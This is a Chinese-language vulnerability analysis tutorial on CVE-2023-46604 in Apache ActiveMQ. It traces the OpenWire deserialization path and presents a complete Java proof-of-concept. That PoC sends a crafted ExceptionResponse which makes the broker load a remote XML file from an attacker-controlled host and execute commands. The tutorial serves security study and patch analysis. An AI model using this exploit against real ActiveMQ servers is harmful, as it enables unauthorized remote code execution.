

# 奇安信攻防社区 -【Web 实战】ActiveMQ 漏洞分析保姆教程（CVE-2023-46604）

### 【Web 实战】ActiveMQ 漏洞分析保姆教程（CVE-2023-46604）

ActiveMQ 漏洞分析保姆教程（CVE-2023-46604）by 猫蛋儿安全团队

# **一、寻找触发点**

首先通过代码对照工具需要漏洞触发点位置。根据对于的代码定位到 BaseDataStreamMarshaller 这个类的位置，可以看到这里通过反射调用实例化了一个构造函数传参为 String 的类。并且可以看到 5.18.3 增加了过滤规则，所以我们跟进 IDEA 里面进行进一步分析。

![image.png](assets/1700814472-925e34bbde8f3e98e0c1fe8617378f5d.png)  
进入 5.18.3 版本的代码查看过滤函数。这里对类进行了一次判断，确定传入类是不是继承来自于另一个父类 Throwable，如果不是抛出异常。

![image.png](assets/1700814472-1a542a9d14b5a7999c454ac0731f92f9.png)

# **二、触发点分析**

我们通过对照函数找到了触发点，下一步我们将对触发函数进行进一步的分析首先找到触发点的位置。跟到 BaseDataStreamMarshaller.createThrowable 位置。  
![image.png](assets/1700814472-3fea7cbfee30cdf96abcd9c467522c99.png)  
寻找 createThrowable 函数是什么位置进行触发。可以看到可以通过 tightUnmarsalThrowable、looseUnmarsalThrowable 两个方法进行触发。

我们了解到这里是通过传入的参数 dataIn 获取的传入的 claszz 和 message。

![image.png](assets/1700814472-42cc2b4951f2b3d1c5e58fdfa1366017.png)

![image.png](assets/1700814472-dd445db97d94c7802247442faacbe9df.png)

![image.png](assets/1700814472-9860c9575c594b5f360c16edb86d4968.png)

![image.png](assets/1700814472-8e835d3558a25328ae85935e801a0831.png)

回到刚才分析的位置，我们选择跟进其中一个 looseUnmarsalThrowable 进行分析，继续向上寻找 looseUnmarsalThrowable 的触发点。可以看到存在 3 个触发点，分别是 ConnectionErrorMarshaller、ExceptionResponseMarshaller、MessageAckMarshaller。

![image.png](assets/1700814472-020f6ca2421bffc855487c0a86fc983e.png)

我们选择跟进其中一个 ExceptionResponseMarshaller 进行分析，进入 looseUnmarshal 方法后，dataIn 可控，从上层 DataInput dataIn 传入进来。另外我们通过层次结构分析可以看到方法上层通过 OpenWireFormat 进行调用，所以我们继续向上。

![image.png](assets/1700814472-79b0369cfd5b836741f4031a8fead0dd.png)

进入 doUnmarshal，我们从头开始进行分析，传入 DataInput dis 后，会读取 dis 的 readByte()，之后对其选择对应 dataType 的执行器，而我们从上面的分析可以得知我们需要触发 ConnectionErrorMarshaller、ExceptionResponseMarshaller、MessageAckMarshaller 这三个类的 looseUnmarshal 方法，可以看到 ExceptionResponseMarshaller 为 31，ConnectionErrorMarshaller 为 16，MessageAckMarshaller 为 22。

我们上面拿的是 ExceptionResponseMarshaller，所以我们的 dataType 为 31，之后 dsm 创建了一个对应的类，也就是 ExceptionResponse 类。最后对应的执行器带着传入的参数 dis 和创建的类 data 执行 looseUnmarshal 向下。

这里我们可以得知 DataInput dis 需要是 ExceptionResponse 类 dataType 才可为 31，才可以创建对应的执行器，也就是 dsm 才可为 ExceptionResponseMarshaller。

![image.png](assets/1700814472-e0108ccbd7d3a86b8094cb6c89c83cf9.png)

![image.png](assets/1700814472-a1ae60485f93dd662eb9a639af841b52.png)

从 doUnmarshal 方法看完之后我们继续向上我们跟到了 unmarshal 方法的位置。

![image.png](assets/1700814472-c6c422db551b3d911bda9f4dfa2dc809.png)

![image.png](assets/1700814472-1176d3352ab5b7dfe71019ac6ccf7bb0.png)  
通过分析和查询资料得知，不同协议的消息都会从此进行解析。我们可以写一个生产消费的 demo 去测试 TCP 协议的传输。然后我们继续向下跟进。

![image.png](assets/1700814472-0844155b25c704cffb31adc7b581168a.png)

![image.png](assets/1700814472-c078ee0197a6ddd8e6d848aa498992fc.png)

这里我们跟进到了 TcpTransport 类，readCommand()<—doRun()<—run()，这里其实关键的位置就是 readCommand() 方法，这里的 wireFormat.unmarshal 是对数据进行格式化，可以认为这是一个反序列化过程。这个 Command 也就是我们生成的类，所以我们的发送的消息数据也需要是序列化之后的数据。

到此我们的触发点分析也就结束了，现在我们就还需要解决两个问题

1.如何将 marshal 后的 ExceptionResponse 类发送出去。

2.寻找到一个构造函数为 String 类型的利用链。

# **三、\*\***ExceptionResponse**\*\*类**

问题 1：如何将 marshal 后的 ExceptionResponse 类发送出去；

这个问题我们可以通过 TcpTransport.oneway 方法。这个 oneway() 方法里面传入的 Object Command 实际上就是我们正常发送消息使用的 producer.send(ObjectMessage) 里面的 ObjectMessage。这里可以参考以下文章。

[https://www.cnblogs.com/mthoutai/p/6774920.html](https://www.cnblogs.com/mthoutai/p/6774920.html)

[https://www.iteye.com/blog/donald-draper-2348440](https://www.iteye.com/blog/donald-draper-2348440)

另外关于 readCommad() 获取消息的过程可以参考下面的文章。

[https://my.oschina.net/u/4410490/blog/3583489](https://my.oschina.net/u/4410490/blog/3583489)

![image.png](assets/1700814472-edebda8ce461294feb7f6ad9146c2767.png)

![image.png](assets/1700814472-465d51168f2d14a4f5a1ed4258bf5a69.png)

我们简单跟进一下生产者的 send 代码。

![image.png](assets/1700814472-f554ee71b7c43996ecb7cdb9a44a056b.png)  
一路跟进

producer.send(message);

ActiveMQMessageProducerSupport.class

ActiveMQMessageProducer.class

ActiveMQSession.class—>this.connection.syncSendPacket

ActiveMQConnection.class—> this.transport.request(command)

Transport.class

ResponseCorrelator.class

—>this.asyncRequest(command, (ResponseCallback)null);

—>this.next.oneway(command);

Transport.class

MutexTransport.class—> oneway(Object command)

AbstractInactivityMonitor.class

—> oneway(Object o)

—> this.doOnewaySend(o)

![image.png](assets/1700814472-cfce9543fb0874b4ad8bd4c3c773f3a9.png)

![image.png](assets/1700814472-840c088bfec73a5b1628308fde12baff.png)  
AbstractInactivityMonitor 完毕消息发送准备，随后就会调用 TcpTransport。OpenWireFormat，DataOutputStream 通过 tcp 发送消息。

![image.png](assets/1700814472-e1cd89599692fb9c8f6db56fc54a67dc.png)

总结一下消息发送流程：

1.发送消息入口

2.调用 ActiveMQMessageProducerSupport 的 send 方法

3.调用 ActiveMQSession 的 send 接口进行消息发送

4.ActiveMQConnection 发送消息

5.ResponseCorrelator 发送 request

6.调用 MutexTransport 来发送消息

7.调用 AbstractInactivityMonitor 完毕消息发送准备

8.调用 TcpTransport、OpenWireFormat、DataOutputStream

9.终于完毕通过 tcp 发送消息

所以我们只要通过 oneway(Object o) 的方法就相当于 producer.send(message);直接发送消息，我们 ExceptionResponse 类传进去就相当于序列化发送了消息。所以这里我们只需要获取到当前 ActiveMQConnection 的 Transport transport，就可以调用 oneway() 发送消息，代码如下。

![image.png](assets/1700814472-a722dfb976de825f98351b515fea4133.png)

//创建连接工厂  
ActiveMQConnectionFactory activeMQConnectionFactory = new ActiveMQConnectionFactory(*ACTIVEMQ\_URL*);  
//创建连接  
Connection connection = activeMQConnectionFactory.createConnection();  
//打开连接  
connection.start();

//获取 oneway 方法

((ActiveMQConnection)connection).getTransportChannel().oneway(exceptionResponse);

# **四、\*\***ClassPathXmlApplicationContext**\*\*类**

问题 2:寻找到一个构造函数为 String 类型的利用链;

这里其他师傅已经找到利用的点了，这里就简单弄一下。

[https://mp.weixin.qq.com/s/4n7vyeXLtim0tXcjnSWDAw](https://mp.weixin.qq.com/s/4n7vyeXLtim0tXcjnSWDAw)

ClassPathXmlApplicationContext 类可以加载 XML 进行命令执行。

因为 ActiveMQ 自带 spring 相关依赖，所以可以直接利用这个方法。

![image.png](assets/1700814472-5c1437bea16d9a656769ecbf456b53c6.png)

因为这个漏洞触发可以看到都是需要是 Throwable。所以我们只需要制作一个相同路径的 ClassPathXmlApplicationContext 类，触发之后系统将会寻找对应的 ClassPathXmlApplicationContext 类。

![image.png](assets/1700814472-e63a24c15f20efb6fa0d8322749fda41.png)

制作一个 ClassPathXmlApplicationContext 类。

![image.png](assets/1700814472-53b2cf01c43f81737b602729f14a7b9d.png)

按照 ActiveMQ 的发送消息 demo 写一个利用的 POC。

![image.png](assets/1700814472-2b03e9ba1d873567e19893c8709ba285.png)

![image.png](assets/1700814472-5bdd3f8bd231433da6f70398ccbae24d.png)

```jsimport
import org.apache.activemq.ActiveMQConnectionFactory;  
import org.apache.activemq.command.ExceptionResponse;  
import org.apache.activemq.transport.AbstractInactivityMonitor;  
import org.springframework.context.support.ClassPathXmlApplicationContext;  

import javax.jms.\*;  
import java.io.\*;  
import java.lang.reflect.Method;  

public class MQ\_POC {  
    private static final String *ACTIVEMQ\_URL* \= "tcp://172.20.10.7:61616";  
    //定义发送消息的队列名称  
    private static final String *QUEUE\_NAME* \= "tempQueue";  
    public static void main(String\[\] args) throws Exception {  
        //创建连接工厂  
        ActiveMQConnectionFactory activeMQConnectionFactory = new ActiveMQConnectionFactory(*ACTIVEMQ\_URL*);  
        //创建连接  
        Connection connection = activeMQConnectionFactory.createConnection();  
        //打开连接  
        connection.start();  
        Throwable obj2 = new ClassPathXmlApplicationContext("http://172.20.10.4/poc.xml");  
        ExceptionResponse exceptionResponse = new ExceptionResponse(obj2);  

        ((ActiveMQConnection)connection).getTransportChannel().oneway(exceptionResponse);  
        connection.close();  
    }  
}
```

简单跟进一下，就不深入分析了。

![image.png](assets/1700814472-8185e3c50f1be861523a4c8f020c8bb1.png)

![image.png](assets/1700814472-a57d8171b276211cfdf6409d0caf3ee5.png)

成功命令执行。

![image.png](assets/1700814472-a20aafb15eb343819b1f9d9d459dd78a.png)

# **五、漏洞流程完整调试**

首先我们的讲序列化好的数据进行发送。

((ActiveMQConnection)connection).getTransportChannel().oneway(exceptionResponse);

这里将会走以下流程

1.发送消息入口

2.调用 ActiveMQMessageProducerSupport 的 send 方法

3.调用 ActiveMQSession 的 send 接口进行消息发送

4.ActiveMQConnection 发送消息

5.ResponseCorrelator 发送 request

6.调用 MutexTransport 来发送消息

7.调用 AbstractInactivityMonitor 完毕消息发送准备

8.调用 TcpTransport、OpenWireFormat、DataOutputStream

9.终于完毕通过 tcp 发送消息

![image.png](assets/1700814472-94620c63be3087fa364fa4c96cb8517d.png)

ActiveMQ 将会监听 TCP 对应的 61616 端口。

![image.png](assets/1700814472-8d80b2c1d690ad946817a4e6e72f0c92.png)  
对应的会传递到 TcpTransport

![image.png](assets/1700814472-6927938e896cab3f02422ce2e9800ca7.png)

跳转到 OpenWireFormat 开始进行反序列化。

![image.png](assets/1700814472-357e9976c6843ea27dc77f619aa7014d.png)

![image.png](assets/1700814472-db011740f0af5a2fad372774638fbcb1.png)  
我们的类型为对应的 31，之后会进入 tightUnmarshal 方法或者 looseUnmarshal 方法。（这里用 looseUnmarshal 方法举例）

跳转到对应的 looseUnmarshal 方法，之后进入 looseUnmarsalThrowable 方法。

![image.png](assets/1700814472-a8a48ef83cf6aa9b8015d462b01de5d6.png)

进入 looseUnmarsalThrowable 方法，将获取 clazz 和 message 随后将其传入 createThrowable

![image.png](assets/1700814472-2562e4fb7b933dfff866a9b04b4005a3.png)  
进入 createThrowable，反射调用传入 clazz 对应的构造函数然后进行实例化。

![image.png](assets/1700814472-743f9aaa7e4aaf3e8339934fcaa5980f.png)

由于我们 poc 构造的 clazz 是 ClassPathXmlApplicationContext 类，所以对应跳转到改类。

![image.png](assets/1700814472-c4c188327a2d6bd2663d5f681c2d4c98.png)

将传入的位置传入对应的触发点。

![image.png](assets/1700814472-6591c6e3a60ae260fee1333e5876760c.png)

成功利用。

![image.png](assets/1700814472-13ecd0e5adf8b365fbb0107d6837b791.png)
